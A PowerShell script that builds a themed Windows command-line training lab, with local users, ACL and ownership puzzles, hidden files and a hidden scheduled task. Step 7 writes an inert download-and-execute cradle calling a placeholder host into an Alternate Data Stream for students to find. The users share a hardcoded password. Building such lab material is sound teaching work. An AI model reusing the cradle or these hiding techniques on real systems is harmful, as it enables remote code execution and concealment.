#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Setup-WindowsGarrisonLab.ps1
 
    Builds "The Wrkstation Chronicles — Windows Garrison" — a themed practical
    lab covering the CMD/PowerShell command scope used in the companion lab
    guide. Run ONCE, as Administrator, on WKS01 after it has been joined to
    the gielinor.local domain (see the Domain Setup & Workstation Join Guide).
 
.NOTES
    Target: Windows 11 Enterprise, domain-joined to gielinor.local
    Recommended: take a VirtualBox snapshot of WKS01 immediately after this
    script finishes, before starting the lab, so you can revert and re-run
    modules as many times as you want.
#>
 
[CmdletBinding()]
param()
 
$ErrorActionPreference = "Continue"
 
Write-Host "=== [1/12] Verifying environment ===" -ForegroundColor Cyan
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Run this script from an elevated (Administrator) PowerShell session."
    exit 1
}
 
$archiveRoot   = "C:\GielinorArchive"
$shadowDir     = Join-Path $archiveRoot "ShadowFiles"
$chroniclesDir = Join-Path $archiveRoot "Chronicles"
$subDir1       = Join-Path $chroniclesDir "Subfolder1"
$subDir2       = Join-Path $subDir1 "Subfolder2"
$scriptsDir    = Join-Path $archiveRoot "Scripts"
$scratchDir    = Join-Path $archiveRoot "Scratch"
 
foreach ($dir in @($archiveRoot, $shadowDir, $chroniclesDir, $subDir1, $subDir2, $scriptsDir, $scratchDir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}
 
Write-Host "=== [2/12] Creating local groups and Garrison characters (local users) ===" -ForegroundColor Cyan
foreach ($grp in @("Gielinor", "Arrakis")) {
    if (-not (Get-LocalGroup -Name $grp -ErrorAction SilentlyContinue)) {
        New-LocalGroup -Name $grp -Description "Wrkstation Chronicles lab group" | Out-Null
    }
}
 
$labPassword = ConvertTo-SecureString "ChangeMe123!" -AsPlainText -Force
 
$characters = @(
    @{ Name = "General_Graardor"; Full = "General of the God Wars Dungeon"; Group = "Gielinor" },
    @{ Name = "Princess_Irulan";  Full = "Bene Gesserit Scholar";           Group = "Arrakis"  },
    @{ Name = "Zelda_Warden";     Full = "Kokiri Guardian Spirit";          Group = $null      },
    @{ Name = "Navi";             Full = "Fairy Companion";                 Group = $null      },
    @{ Name = "Bandit";           Full = "Bandit Camp Regular";             Group = $null      },
    @{ Name = "Kerbe";            Full = "Mercenary";                       Group = $null      },
    @{ Name = "DAME";             Full = "Rogue Agent";                     Group = $null      },
    @{ Name = "Vaultkeeper";      Full = "Vault Keeper (no interactive logon)"; Group = $null  }
)
 
foreach ($c in $characters) {
    if (-not (Get-LocalUser -Name $c.Name -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name $c.Name -FullName $c.Full -Description $c.Full `
            -Password $labPassword -PasswordNeverExpires:$true -AccountNeverExpires | Out-Null
    }
    if ($c.Group) {
        Add-LocalGroupMember -Group $c.Group -Member $c.Name -ErrorAction SilentlyContinue
    }
}
# Vaultkeeper exists only to own a file — no interactive logon needed
Disable-LocalUser -Name "Vaultkeeper" -ErrorAction SilentlyContinue
 
Write-Host "=== [3/12] Building the ShadowFiles find/permissions puzzle ===" -ForegroundColor Cyan
$rand = New-Object System.Random
for ($i = 1; $i -le 25; $i++) {
    $nameLen = $rand.Next(3, 15)
    $name = -join ((1..$nameLen) | ForEach-Object { [char]$rand.Next(97, 123) })
    $size = $rand.Next(1, 4000)
    $bytes = New-Object byte[] $size
    $rand.NextBytes($bytes)
    $path = Join-Path $shadowDir "$($name)_$i.dat"
    [IO.File]::WriteAllBytes($path, $bytes)
    # Backdate roughly half the junk files so LastWriteTime filtering is meaningful
    if ($i % 2 -eq 0) {
        (Get-Item $path).LastWriteTime = (Get-Date).AddDays(-10)
    }
}
 
# The actual target: exactly 10-character name, exactly 512 bytes, owned by Vaultkeeper
$nightshadePath = Join-Path $shadowDir "Nightshade"
if (Test-Path $nightshadePath) {
    # Undo a prior run's restrictive ACL so this run can overwrite the file
    takeown /f $nightshadePath | Out-Null
    icacls $nightshadePath /grant "Administrators:F" | Out-Null
}
[IO.File]::WriteAllBytes($nightshadePath, (New-Object byte[] 512))
icacls $nightshadePath /setowner "Vaultkeeper" | Out-Null
icacls $nightshadePath /inheritance:r | Out-Null
icacls $nightshadePath /grant "Vaultkeeper:(R)" | Out-Null
 
Write-Host "=== [4/12] Building the warplans / ownership scenario ===" -ForegroundColor Cyan
$warplansPath = Join-Path $chroniclesDir "warplans.txt"
@"
OPERATION NIGHTSHADE — EYES ONLY
Phase 1: secure the eastern bridge.
Phase 2: rendezvous at the old mill.
"@ | Set-Content -Path $warplansPath
icacls $warplansPath /setowner "General_Graardor" | Out-Null
 
Write-Host "=== [5/12] Building the locked-file (takeown/icacls) scenario ===" -ForegroundColor Cyan
$lockedPath = Join-Path $chroniclesDir "locked.txt"
if (Test-Path $lockedPath) {
    # Undo a prior run's deny entry so this run can overwrite the file
    icacls $lockedPath /reset | Out-Null
}
Set-Content -Path $lockedPath -Value "This content is locked away — Chronicles archive."
$currentIdentity = "$env:USERDOMAIN\$env:USERNAME"
icacls $lockedPath /deny "${currentIdentity}:F" | Out-Null
 
Write-Host "=== [6/12] Building the hidden-file and dir-switch scenario ===" -ForegroundColor Cyan
$normalPath   = Join-Path $chroniclesDir "normal.txt"
$hiddenPath   = Join-Path $chroniclesDir "hidden.txt"
$deepNotePath = Join-Path $subDir2 "deep_note.txt"
$deepFilePath = Join-Path $subDir2 "deepfile.txt"
 
Set-Content -Path $normalPath -Value "This looks like a boring text file."
Set-Content -Path $hiddenPath -Value "secret garrison note"
attrib +h +s $hiddenPath
Set-Content -Path $deepNotePath -Value "innocent"
Set-Content -Path $deepFilePath -Value "deep archive file"
 
Write-Host "=== [7/12] Planting Alternate Data Streams (inert text, not real payloads) ===" -ForegroundColor Cyan
Set-Content -Path $normalPath -Stream "payload" -Value "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/x')"
Set-Content -Path $deepFilePath -Stream "notes" -Value "hidden config data"
 
Write-Host "=== [8/12] Writing the sector-scan log for content-search practice ===" -ForegroundColor Cyan
$scanLogPath = Join-Path $chroniclesDir "sector_scan.log"
@"
Reference activity log — DO NOT DELETE
[INFO] service started cleanly
[ERROR] connection timeout on adapter 2
[WARN] retrying handshake
[ERROR] failed login attempt recorded
[INFO] scheduled sync complete
[ERROR] disk read failure sector 44
"@ | Set-Content -Path $scanLogPath
 
Write-Host "=== [9/12] Starting the WizardTower background task (process/service module) ===" -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName "WizardTower" -Confirm:$false -ErrorAction SilentlyContinue
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-WindowStyle Hidden -NoProfile -Command "Start-Sleep -Seconds 100000"'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
Register-ScheduledTask -TaskName "WizardTower" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
Start-ScheduledTask -TaskName "WizardTower"
 
Write-Host "=== [10/12] Enabling process-creation auditing (Event ID 4688) ===" -ForegroundColor Cyan
auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
 
Write-Host "=== [11/12] Confirming a live service (Print Spooler) for process<->service mapping ===" -ForegroundColor Cyan
Set-Service -Name Spooler -StartupType Automatic -ErrorAction SilentlyContinue
Start-Service -Name Spooler -ErrorAction SilentlyContinue
 
Write-Host "=== [12/12] Sharing the archive and dropping the scripting capstone skeleton ===" -ForegroundColor Cyan
if (-not (Get-SmbShare -Name "GielinorArchive" -ErrorAction SilentlyContinue)) {
    New-SmbShare -Name "GielinorArchive" -Path $archiveRoot -ReadAccess "Everyone" | Out-Null
}
Remove-SmbMapping -LocalPath "Z:" -Force -ErrorAction SilentlyContinue | Out-Null
New-SmbMapping -LocalPath "Z:" -RemotePath "\\$env:COMPUTERNAME\GielinorArchive" -Persistent $true -ErrorAction SilentlyContinue | Out-Null
 
@'
# Get-AccountStatus.ps1
# Usage: .\Get-AccountStatus.ps1 -Username <name>
#
# TODO (Module 12 capstone): complete this so it prints exactly one of:
#   "No such user"   - if no local account by that name exists
#   "Disabled"        - if the account exists but is disabled
#   "Active"          - if the account exists and is enabled
#
# Hints: Get-LocalUser -Name <name> -ErrorAction SilentlyContinue, and its .Enabled property
 
param(
    [Parameter(Mandatory = $true)]
    [string]$Username
)
 
$acct = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
 
# TODO: fill in the if / elseif / else logic here using $acct
'@ | Set-Content -Path (Join-Path $scriptsDir "Get-AccountStatus.ps1")
 
Write-Host ""
Write-Host "############################################################" -ForegroundColor Green
Write-Host "  Windows Garrison lab environment build complete." -ForegroundColor Green
Write-Host "  Take a VM snapshot now, then open the lab guide." -ForegroundColor Green
Write-Host "############################################################" -ForegroundColor Green
 